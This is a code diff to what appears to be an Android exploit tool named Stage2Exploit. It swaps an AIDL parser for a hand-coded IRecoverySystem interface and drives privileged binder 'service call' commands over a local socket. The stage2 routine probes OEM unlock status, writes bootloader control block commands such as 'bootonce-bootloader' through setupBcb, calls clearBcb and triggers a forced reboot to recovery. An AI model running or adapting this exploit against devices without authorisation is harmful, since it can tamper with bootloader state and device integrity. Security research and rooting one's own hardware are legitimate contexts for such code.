@@ -4,7 +4,6 @@ import re
 import shlex
 from typing import Any
 from io import BytesIO
-from warnings import warn
 from pathlib import Path
 
 import aidl
@@ -49,18 +48,74 @@ def parse_boolean_result(result: bytes) -> bool:
     return bool(number)
 
 
-# ----- Load AIDL definitions -----
+# ----- IOemLockService: 通常通り AIDL パーサーを使用 -----
 with open(Path(__file__).parent / "IOemLockService.aidl") as f:
     oem_lock_aidl = f.read()
 oem_lock_service = parse_aidl_interface(
     aidl.fromstring(oem_lock_aidl), "IOemLockService"
 )
 
-with open(Path(__file__).parent / "IRecoverySystem.aidl") as f:
-    recovery_aidl = f.read()
-recovery_service = parse_aidl_interface(
-    aidl.fromstring(recovery_aidl), "IRecoverySystem"
-)
+
+# ----- IRecoverySystem: 手動でコードを定義（AIDL パーサーの誤りを回避） -----
+class RecoveryService:
+    def __init__(self):
+        self.functions = {
+            "uncrypt": {
+                "code": 1,
+                "parse_arguments": self._parse_uncrypt,
+                "parse_return": self._parse_boolean,
+            },
+            "setupBcb": {
+                "code": 2,
+                "parse_arguments": self._parse_setupBcb,
+                "parse_return": self._parse_boolean,
+            },
+            "clearBcb": {
+                "code": 3,
+                "parse_arguments": self._parse_noargs,
+                "parse_return": self._parse_boolean,
+            },
+            "rebootRecoveryWithCommand": {
+                "code": 4,
+                "parse_arguments": self._parse_rebootRecovery,
+                "parse_return": self._parse_void,
+            },
+        }
+
+    def _parse_uncrypt(self, args):
+        # uncrypt(String, IRecoverySystemProgressListener) - 今回は使わない
+        raise NotImplementedError("uncrypt not implemented")
+
+    def _parse_setupBcb(self, args):
+        if len(args) != 1 or not isinstance(args[0], str):
+            raise ValueError("setupBcb takes exactly one String argument")
+        return ["s16", args[0]]
+
+    def _parse_noargs(self, args):
+        if args:
+            raise ValueError("this method takes no arguments")
+        return []
+
+    def _parse_rebootRecovery(self, args):
+        if len(args) != 1 or not isinstance(args[0], str):
+            raise ValueError("rebootRecoveryWithCommand takes exactly one String argument")
+        return ["s16", args[0]]
+
+    def _parse_boolean(self, raw: bytes):
+        if len(raw) < 8:
+            return (0, False)
+        status = int.from_bytes(raw[:4], "little")
+        val = bool(int.from_bytes(raw[4:8], "little"))
+        return (status, val)
+
+    def _parse_void(self, raw: bytes):
+        return (0, None)
+
+    def __getitem__(self, key):
+        return self.functions[key]
+
+
+recovery_service = RecoveryService()
 
 known_services = {
     "oem_lock": oem_lock_service,
@@ -81,13 +136,13 @@ class Stage2Exploit:
     ) -> Any:
         interface = known_services[service_name]
         service_function = interface[function]
-        parsed_arguments = service_function.parse_arguments(arguments)
+        parsed_arguments = service_function["parse_arguments"](arguments)
 
         command_parameters = [
             "service",
             "call",
             service_name,
-            str(service_function.code),
+            str(service_function["code"]),
             *parsed_arguments,
         ]
         command = shlex.join(command_parameters) + "\n"
@@ -95,7 +150,7 @@ class Stage2Exploit:
         service_result = device_socket.recv(10000).decode("utf-8")
 
         return_value = parse_service_result(service_result)
-        parsed_return_value = service_function.parse_return(return_value)
+        parsed_return_value = service_function["parse_return"](return_value)
         status_code = parsed_return_value[0]
 
         formatted_arguments = ", ".join(repr(argument) for argument in arguments)
@@ -104,23 +159,20 @@ class Stage2Exploit:
             raise ZygoteInjectionException(
                 f"service call {formatted_service_call} returned error {status_code:d}"
             )
-        if parsed_return_value[1:]:
+        if parsed_return_value[1] is not None:
             print(
                 f"service call {formatted_service_call} = {repr(parsed_return_value[1])}"
             )
         else:
             print(f"service call {formatted_service_call}")
-        try:
-            return parsed_return_value[1]
-        except IndexError:
-            return None
+        return parsed_return_value[1]
 
     def exploit_stage2(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
             device_socket.connect(("127.0.0.1", self.port))
             device_socket.sendall(b"\n")
 
-            # ----- OEM unlock -----
+            # ----- OEM unlock (original) -----
             print("=== OEM Unlock ===")
             allowed_by_carrier = self.call_service(
                 device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
@@ -165,7 +217,6 @@ class Stage2Exploit:
             # ----- BCB write via IRecoverySystem -----
             print("\n=== BCB Write via IRecoverySystem.setupBcb ===")
 
-            # Try multiple commands
             commands = [
                 "bootonce-bootloader",
                 "reboot-bootloader",
@@ -189,7 +240,6 @@ class Stage2Exploit:
                 except Exception as e:
                     print(f"[!] setupBcb('{cmd}') failed: {e}")
 
-            # Also try clearBcb to see if we have access
             print("\n=== Trying clearBcb ===")
             try:
                 result = self.call_service(device_socket, "recovery", "clearBcb")
@@ -200,7 +250,6 @@ class Stage2Exploit:
             except Exception as e:
                 print(f"[!] clearBcb failed: {e}")
 
-            # Finally, try rebootRecoveryWithCommand (dangerous!)
             print("\n=== Trying rebootRecoveryWithCommand (device will reboot to recovery if successful) ===")
             try:
                 self.call_service(
